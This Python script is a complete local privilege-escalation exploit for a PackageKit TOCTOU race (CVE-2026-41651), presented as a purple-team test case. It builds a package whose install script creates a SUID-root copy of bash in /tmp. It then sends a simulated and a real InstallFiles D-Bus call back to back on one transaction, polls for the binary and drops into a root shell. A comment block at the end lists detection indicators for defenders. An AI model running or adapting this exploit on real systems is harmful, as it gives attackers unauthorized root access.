#!/usr/bin/env python3
"""
CVE-2026-41651 - PackageKit TOCTOU Privilege Escalation
Purple Team Test Case | FOR AUTHORIZED USE ON TEST SYSTEMS ONLY

Vulnerability: TOCTOU race in PackageKit's D-Bus transaction handling.
A client can call InstallFiles twice on the same transaction — once with
FLAG_SIMULATE (triggering authorization) and immediately again with FLAG_NONE
(real install) before the auth check resolves. The second call's payload
executes with root privileges.

Fix: PackageKit 1.3.5 (commit 76cfb675) — state guard in pk-transaction.c
     rejects re-invocation of action methods after PK_TRANSACTION_STATE_NEW.

Supports: Debian/Ubuntu (dpkg-deb) and RHEL/Fedora/SUSE (rpmbuild)
Requires: python3-gi (GObject introspection bindings)
"""

import os
import sys
import shutil
import subprocess
import time
from pathlib import Path

try:
    from gi.repository import Gio, GLib
except ImportError:
    sys.exit("[-] Missing python3-gi. Install: apt install python3-gi  OR  dnf install python3-gobject")

# ── Config ───────────────────────────────────────────────────────────────────

SUID_PATH   = "/tmp/.suid_bash"
PK_BUS      = "org.freedesktop.PackageKit"
PK_OBJ      = "/org/freedesktop/PackageKit"
PK_IFACE    = "org.freedesktop.PackageKit"
TX_IFACE    = "org.freedesktop.PackageKit.Transaction"
POLL_SECS   = 90

FLAG_SIMULATE = 4   # PK_TRANSACTION_FLAG_SIMULATE — triggers auth but does not install
FLAG_NONE     = 0   # No flags — real install

# ── Package builders ─────────────────────────────────────────────────────────

def _detect_pkg_mgr():
    if shutil.which("dpkg-deb"):
        return "deb"
    if shutil.which("rpmbuild"):
        return "rpm"
    sys.exit("[-] No supported package builder found (need dpkg-deb or rpmbuild)")


def _build_deb(out_path: str, pkg_name: str, postinst: str = None):
    build = Path(f"/tmp/pkbuild_{pkg_name}")
    deb   = build / "DEBIAN"
    deb.mkdir(parents=True, exist_ok=True)

    (deb / "control").write_text(
        f"Package: {pkg_name}\nVersion: 1.0\nArchitecture: all\n"
        f"Maintainer: purple-team\nDescription: CVE-2026-41651 test package\n"
    )
    if postinst:
        pi = deb / "postinst"
        pi.write_text(f"#!/bin/sh\n{postinst}\n")
        pi.chmod(0o755)

    subprocess.run(
        ["dpkg-deb", "-b", str(build), out_path],
        check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    shutil.rmtree(build, ignore_errors=True)


def _build_rpm(out_dir: str, pkg_name: str, post_script: str = None) -> str:
    topdir = Path(f"/tmp/rpmbuild_{pkg_name}")
    for sub in ("BUILD", "RPMS", "SOURCES", "SPECS", "SRPMS"):
        (topdir / sub).mkdir(parents=True, exist_ok=True)

    post_section = f"%post\n{post_script}\n" if post_script else ""
    spec_text = f"""%global _topdir {topdir}
Name:        {pkg_name}
Version:     1.0
Release:     1
Summary:     CVE-2026-41651 test package
License:     MIT
BuildArch:   noarch

%description
Purple team test package for CVE-2026-41651.

{post_section}
%files
"""
    spec_path = topdir / "SPECS" / f"{pkg_name}.spec"
    spec_path.write_text(spec_text)

    subprocess.run(
        ["rpmbuild", "--define", f"_topdir {topdir}", "-bb", str(spec_path)],
        check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    rpms = list((topdir / "RPMS").rglob("*.rpm"))
    if not rpms:
        sys.exit(f"[-] rpmbuild produced no output for {pkg_name}")

    dest = os.path.join(out_dir, f"{pkg_name}.rpm")
    shutil.copy2(str(rpms[0]), dest)
    shutil.rmtree(topdir, ignore_errors=True)
    return dest


def build_packages(pkg_mgr: str):
    pid            = os.getpid()
    payload_script = f"install -m 4755 /bin/bash {SUID_PATH}"

    if pkg_mgr == "deb":
        dummy   = f"/tmp/pk-dummy-{pid}.deb"
        payload = f"/tmp/pk-payload-{pid}.deb"
        _build_deb(dummy,   f"pk-dummy-{pid}")
        _build_deb(payload, f"pk-payload-{pid}", postinst=payload_script)
    else:
        dummy   = _build_rpm("/tmp", f"pk-dummy-{pid}")
        payload = _build_rpm("/tmp", f"pk-payload-{pid}", post_script=payload_script)

    return dummy, payload

# ── D-Bus / exploit logic ─────────────────────────────────────────────────────

def create_transaction(conn) -> str:
    res = conn.call_sync(
        PK_BUS, PK_OBJ, PK_IFACE, "CreateTransaction",
        None, GLib.VariantType("(o)"),
        Gio.DBusCallFlags.NONE, -1, None
    )
    return res.unpack()[0]


def fire_race(conn, tid: str, dummy: str, payload: str):
    """
    Send both InstallFiles calls on the same transaction object without waiting.

    Call 1 — FLAG_SIMULATE (4): PackageKit queues an authorization check for
              installing <dummy>. No install occurs yet.
    Call 2 — FLAG_NONE (0): Re-invokes InstallFiles on the same transaction
              with the real payload before the auth check resolves.  On
              vulnerable versions the state guard is absent, so the second
              call overwrites the queued parameters; when polkit grants auth
              the payload executes instead of the dummy.
    """
    conn.call(
        PK_BUS, tid, TX_IFACE, "InstallFiles",
        GLib.Variant("(tas)", (FLAG_SIMULATE, [dummy])),
        None, Gio.DBusCallFlags.NONE, -1, None, None
    )
    conn.call(
        PK_BUS, tid, TX_IFACE, "InstallFiles",
        GLib.Variant("(tas)", (FLAG_NONE, [payload])),
        None, Gio.DBusCallFlags.NONE, -1, None, None
    )
    conn.flush_sync(None)


def poll_suid(path: str, timeout: int) -> bool:
    print(f"[*] Polling for SUID at {path} ({timeout}s max)...")
    for _ in range(timeout):
        try:
            st = os.stat(path)
            if st.st_mode & 0o4000 and st.st_uid == 0:
                print(f"\n[+] Confirmed: {path} is SUID root (mode={oct(st.st_mode)})")
                return True
        except FileNotFoundError:
            pass
        print(".", end="", flush=True)
        time.sleep(1)
    print()
    return False

# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    print("=" * 60)
    print("  CVE-2026-41651 — PackageKit TOCTOU LPE")
    print("  Purple Team Test Case | Authorized Use Only")
    print("=" * 60)
    print()

    if os.geteuid() == 0:
        sys.exit("[-] Must be run as an unprivileged user to demonstrate the bug")

    pkg_mgr = _detect_pkg_mgr()
    print(f"[+] Package format: {pkg_mgr.upper()}")

    print("[*] Building test packages...")
    dummy_path, payload_path = build_packages(pkg_mgr)
    print(f"[+] Dummy pkg:   {dummy_path}")
    print(f"[+] Payload pkg: {payload_path}")
    print(f"[+] Payload installs SUID bash to: {SUID_PATH}")
    print()

    print("[*] Connecting to system D-Bus...")
    conn = Gio.bus_get_sync(Gio.BusType.SYSTEM, None)

    print("[*] Creating PackageKit transaction...")
    tid = create_transaction(conn)
    print(f"[+] Transaction ID: {tid}")
    print()

    print("[*] Firing TOCTOU race (SIMULATE → REAL on same transaction)...")
    fire_race(conn, tid, dummy_path, payload_path)

    success = poll_suid(SUID_PATH, POLL_SECS)

    # Cleanup packages regardless of outcome
    for p in (dummy_path, payload_path):
        try:
            os.unlink(p)
        except OSError:
            pass

    if not success:
        print("[-] Exploit window missed — system may be patched or timing was unfavorable")
        print("[-] Note: this race is non-deterministic; retry if system is confirmed vulnerable")
        print(f"[-] Check PackageKit version: pkcon backend-details")
        sys.exit(1)

    print()
    print("[+] Dropping to root shell via SUID bash (-p preserves effective UID=0)")
    print("[+] --- ROOT SHELL FOLLOWS ---")
    print()
    os.execl(SUID_PATH, SUID_PATH, "-p")


# ── Detection artifacts (for the Blue side) ───────────────────────────────────
#
# Indicators defenders should look for:
#
#  D-Bus:
#   - Multiple rapid InstallFiles calls on the same transaction object path
#   - FLAG_SIMULATE (4) call immediately followed by FLAG_NONE (0) on same tid
#   - Audit rule: -w /usr/share/dbus-1/ -p wa
#
#  File system:
#   - Creation of SUID root binary in /tmp (mode 04755, owner root)
#   - dpkg-deb / rpmbuild invoked by non-root, non-package-manager process
#   - Transient .deb/.rpm files created in /tmp by unprivileged user
#
#  Process:
#   - bash process with UID != EUID (SUID execution)
#   - PackageKit (packagekitd) running postinst/post scripts from /tmp packages
#
#  Audit / syslog:
#   - packagekitd executing /bin/sh from a %post or postinst originating in /tmp
#   - polkit granting org.freedesktop.packagekit.package-install to local user
#     for a package not sourced from a trusted repository
#
# SIEM rule sketch (pseudo):
#   event.type == "process_start"
#   AND process.parent.name == "packagekitd"
#   AND process.name == "sh"
#   AND process.args matches "/tmp/*"

if __name__ == "__main__":
    main()
